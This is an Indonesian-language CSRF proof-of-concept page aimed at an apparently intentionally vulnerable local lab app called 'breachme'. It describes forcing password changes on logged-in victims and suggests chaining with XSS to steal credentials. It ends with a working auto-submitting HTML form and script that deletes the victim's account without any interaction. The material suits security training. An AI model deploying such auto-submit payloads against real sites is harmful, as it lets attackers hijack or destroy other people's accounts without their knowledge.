⚡ CSRF PoC — Ganti Password Tanpa Token

Halaman ini mensimulasikan serangan CSRF terhadap /public/profile.php.

Jika korban membuka halaman ini saat sedang login di breachme, password-nya akan diganti.

Target: http://localhost:8080/public/profile.php

Vuln: Form tidak menggunakan CSRF token — request dari domain lain diterima.

Klik tombol di bawah untuk trigger CSRF request manual (simulasi):



Catatan: CSRF change_password butuh old_password — combine dengan vuln lain (e.g. XSS steal credentials) untuk full chain.

Auto-submit CSRF (tanpa interaksi korban):

Untuk delete account (tidak butuh old password verifikasi yang kita tahu):

<form id="f" method="POST" action="http://localhost:8080/public/profile.php">
  <input type="hidden" name="action" value="delete_account">
  <input type="hidden" name="delete_confirm_password" value="targetpassword">
</form>
<script>document.getElementById('f').submit();</script>
